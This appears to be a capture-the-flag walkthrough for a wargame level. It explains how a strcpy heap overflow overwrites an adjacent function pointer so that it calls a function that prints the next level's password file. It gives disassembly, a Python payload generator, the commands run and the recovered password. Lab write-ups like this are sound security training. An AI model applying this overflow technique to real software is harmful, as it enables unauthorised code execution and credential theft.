# Level 06 Walkthrough

## Binary analysis

The binary allocates two buffers with `malloc`: one for a string (0x40 bytes) and one for a function pointer (4 bytes). The function pointer is initialized to `m()`, which just prints "Nope". The user input (argv[1]) is copied into the string buffer with `strcpy`, which is vulnerable to overflow. After the copy, the function pointer is called. If we overflow the string buffer, we can overwrite the function pointer to point to `n()`, which calls `system("/bin/cat /home/user/level7/.pass")`.

Relevant code:
```
0804848c        char* str = malloc(bytes: 0x40)
0804849c        int32_t (** table)() = malloc(bytes: 4)
080484ae        *table = m
080484c5        strcpy(str, argv[1])
080484d3        return (*table)()

n() at 0x08048454: system("/bin/cat /home/user/level7/.pass")
m() at 0x08048468: puts("Nope")
```

## Exploitation

We overflow the string buffer to overwrite the function pointer with the address of `n()` (0x08048454).

Python script to generate the payload:
```python
from struct import pack

str_addr = 0x804a008  # Address returned by malloc for the string buffer
ptr_addr = 0x804a050  # Address returned by malloc for the function pointer
n_addr = 0x08048454   # Address of n()

payload = b"A" * (ptr_addr - str_addr) + pack("<I", n_addr)
with open("payload.txt", "wb") as f:
    f.write(payload)
```

## Commands used

```
./level6 $(cat payload.txt)
cat /home/user/level7/.pass
```

## Result

After running the exploit, we get the password for level7:

```
cat /home/user/level7/.pass
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

Copy the password for the next level. 